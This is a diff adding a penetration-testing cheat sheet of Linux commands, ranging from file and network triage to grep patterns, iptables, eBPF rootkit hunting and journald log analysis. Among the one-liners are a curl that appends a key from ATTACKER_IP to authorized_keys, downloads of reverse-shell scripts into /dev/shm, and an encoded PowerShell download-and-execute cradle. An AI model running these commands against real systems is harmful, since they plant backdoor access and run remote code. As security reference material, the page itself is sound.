@@ -1,0 +1,266 @@
+---
+title: "Useful Linux Commands"
+description: "Essential Linux commands for penetration testing: file manipulation, network enumeration, grep patterns, iptables, eBPF hunting, and log analysis"
+---
+
+## Overview
+
+A curated reference of Linux commands most useful during penetration tests and security assessments, organized by category.
+
+## Common Bash One-Liners
+
+```bash
+# Base64 exfiltration (no newlines)
+base64 -w 0 file
+
+# Hex dump without newlines
+xxd -p boot12.bin | tr -d '\n'
+
+# Add attacker's public key to authorized_keys
+curl https://ATTACKER_IP/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys
+
+# Count lines / characters
+wc -l <file>
+wc -c <file>
+
+# Sort and deduplicate
+sort -nr
+cat file | sort | uniq
+
+# In-place string replacement
+sed -i 's/OLD/NEW/g' path/file
+
+# Download to RAM
+wget 10.10.14.14:8000/rev.py -O /dev/shm/.rev.py
+curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
+
+# Set not-removable bit
+sudo chattr +i file.txt
+sudo chattr -i file.txt   # remove it
+
+# List files inside zip
+7z l file.zip
+```
+
+## Network-Aware File Operations (lsof)
+
+```bash
+lsof                                # All open files, any process
+lsof -p 3                           # Open files for PID 3
+lsof -i                             # Files used by network processes
+lsof -i 4                           # IPv4 only
+lsof -i 6                           # IPv6 only
+lsof -i :80                         # Port 80
+lsof +D /lib                        # Processes using files in /lib
+fuser -nv tcp 80
+
+# /proc quick triage
+ls -l /proc/<PID>/fd                # Per-process file descriptors
+readlink /proc/<PID>/fd/<FD>        # Resolve FD target
+cat /proc/<PID>/fd/<FD>             # Read via open FD
+find /proc/[0-9]*/fd -lname '*deleted*' 2>/dev/null  # Deleted-but-open files
+lsof +L1                            # Another way to find deleted-but-open files
+```
+
+## Decompression
+
+```bash
+tar -xvzf file.tgz
+tar -xvjf file.tbz
+bzip2 -d file.bz2
+tar jxf file.tar.bz2
+gunzip file.gz
+unzip file.zip
+7z -x file.7z
+unxz file.xz
+```
+
+## HTTP Servers (Quick)
+
+```bash
+python3 -m http.server 80
+python2 -m SimpleHTTPServer 80
+ruby -rwebrick -e "WEBrick::HTTPServer.new(:Port => 80, :DocumentRoot => Dir.pwd).start"
+php -S $ip:80
+```
+
+## OpenSSL Operations
+
+```bash
+openssl s_client -connect 10.10.10.127:443   # Get certificate
+openssl x509 -in ca.cert.pem -text           # Read certificate
+openssl genrsa -out newuser.key 2048          # New RSA2048 key
+openssl req -new -key newuser.key -out newuser.csr
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+openssl rsa -in key.ssh.enc -out key.ssh      # Decrypt SSH key
+openssl enc -aes256 -k <KEY> -d -in backup.tgz.enc -out b.tgz
+```
+
+## Grep Patterns for Pentesters
+
+<AccordionGroup>
+  <Accordion title="Credentials and Sensitive Data">
+    ```bash
+    # Extract emails
+    grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" file.txt
+
+    # Extract valid IP addresses
+    grep -E -o "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)" file.txt
+
+    # Extract passwords
+    grep -i "pwd\|passw" file.txt
+
+    # Extract usernames
+    grep -i "user\|invalid\|authentication\|login" file.txt
+    ```
+  </Accordion>
+
+  <Accordion title="Hash Extraction">
+    ```bash
+    # MD5 (32 chars)
+    egrep -oE '(^|[^a-fA-F0-9])[a-fA-F0-9]{32}([^a-fA-F0-9]|$)' *.txt | egrep -o '[a-fA-F0-9]{32}' > md5-hashes.txt
+
+    # Blowfish
+    grep -e '$2a\$\08\$(.){75}' *.txt > blowfish-hashes.txt
+
+    # sha512crypt
+    egrep -o '$6$\w{8}\S{86}' *.txt > sha512crypt.txt
+    ```
+  </Accordion>
+
+  <Accordion title="URLs and HTTP Data">
+    ```bash
+    # HTTP URLs
+    grep http | grep -shoP 'http.*?[" >]' *.txt > http-urls.txt
+
+    # HTTPS/FTP/etc.
+    grep -E '(((https|ftp|gopher)|mailto)[.:][^ >"	]*|www.[-a-z0-9.]+)[^ .,;	>">):]' *.txt > urls.txt
+    ```
+  </Accordion>
+</AccordionGroup>
+
+## Find Commands
+
+```bash
+# SUID set files
+find / -perm /u=s -ls 2>/dev/null
+
+# SGID set files
+find / -perm /g=s -ls 2>/dev/null
+
+# Writable directories (depth 10)
+find / -type d -maxdepth 10 -writable -printf "%T@ %Tc | %p \n" 2>/dev/null \
+  | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /sys/" | sort -n -r
+
+# Files owned by current user (depth 10)
+find / -maxdepth 10 -user $(id -u) -printf "%T@ %Tc | %p \n" 2>/dev/null \
+  | grep -v "| /proc" | grep -v "| /dev" | sort -n -r
+
+# Files modified in last 5 minutes
+find / -maxdepth 5 -type f -newer /tmp/marker 2>/dev/null
+
+# Find from specific date range (HTB style)
+find / -newermt 2018-12-12 ! -newermt 2018-12-14 -type f -readable \
+  -not -path "/proc/*" -not -path "/sys/*" -ls 2>/dev/null
+```
+
+## Iptables
+
+```bash
+# Flush and reset
+iptables --flush
+iptables --delete-chain
+
+# Allow loopback
+iptables -A INPUT -i lo -j ACCEPT
+iptables -A OUTPUT -o lo -j ACCEPT
+
+# Drop ICMP
+iptables -A INPUT -p icmp -m icmp --icmp-type any -j DROP
+iptables -A OUTPUT -p icmp -j DROP
+
+# Allow established connections
+iptables -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT
+
+# Allow SSH, HTTP, HTTPS, DNS
+iptables -A INPUT -s 10.10.10.10/24 -p tcp -m tcp --dport 22 -j ACCEPT
+iptables -A INPUT -p tcp -m state --state NEW -m tcp --dport 80 -j ACCEPT
+iptables -A INPUT -p tcp -m state --state NEW -m tcp --dport 443 -j ACCEPT
+iptables -A INPUT -p udp -m udp --sport 53 -j ACCEPT
+
+# Default policies
+iptables -P INPUT DROP
+iptables -P FORWARD ACCEPT
+iptables -P OUTPUT ACCEPT
+```
+
+## Nmap Script Help
+
+```bash
+# Find scripts matching criteria
+nmap --script-help "(default or version) and *smb*"
+locate -r '\.nse$' | xargs grep categories | grep 'default\|version\|safe' | grep smb
+```
+
+## Windows-Targeted Commands (from Linux)
+
+```bash
+# Base64 encode PowerShell command for Windows
+echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/9002.ps1')" \
+  | iconv --to-code UTF-16LE | base64 -w0
+
+# Compress Windows executable
+upx -9 nc.exe
+
+# Cross-compile for Windows
+i686-mingw32msvc-gcc -o executable useradd.c
+
+# Compile Python exploit to Windows EXE
+pip install pyinstaller
+python pyinstaller.py --onefile exploit.py
+```
+
+## eBPF Telemetry and Rootkit Hunting
+
+Modern rootkits (TripleCross, BPFDoor variants) persist as hidden eBPF programs. Use `bpftool` to detect them:
+
+```bash
+# Enumerate all eBPF programs, attach points, owning PIDs, and map IDs
+sudo bpftool prog
+
+# Inspect suspicious bytecode and helper calls (replace 835 with program id)
+sudo bpftool prog dump xlated id 835 | less
+
+# List and dump program maps (replace 104 with map id)
+sudo bpftool map show id 104
+sudo bpftool map dump id 104 | hexdump -C
+
+# Verify kernel feature support
+sudo bpftool feature probe | less
+
+# Real-time eBPF monitoring TUI
+sudo ebpfmon
+```
+
+<Tip>
+Correlate `bpftool` output with expected NIC/cgroup attachments. A sudden `xdp` or `kprobe` program owned by an unapproved PID is a strong indicator of an injected eBPF payload.
+</Tip>
+
+## Journald Incident Triage
+
+`systemd-journald` provides structured, filterable logs without touching `/var/log/*`:
+
+```bash
+journalctl --list-boots                                  # Enumerate boot IDs
+journalctl -b -1 -p err -o short-iso                    # Previous boot, severity >= err
+journalctl -u nginx.service --since="2025-06-01 01:00" --until="2025-06-01 02:00"
+journalctl -u ssh.service -f | grep "Failed password"   # Live brute-force monitoring
+journalctl _UID=0 --output=json-pretty --since "1 hour ago"
+journalctl --disk-usage
+journalctl --no-pager --since="2025-06-01" --until="2025-06-10" > evidence.log
+```
+
+## References
+
+- [eBPFmon — Red Canary](https://redcanary.com/blog/linux-security/ebpfmon/)
+- [journalctl Command Guide — Hostinger](https://www.hostinger.com/tutorials/journalctl-command)
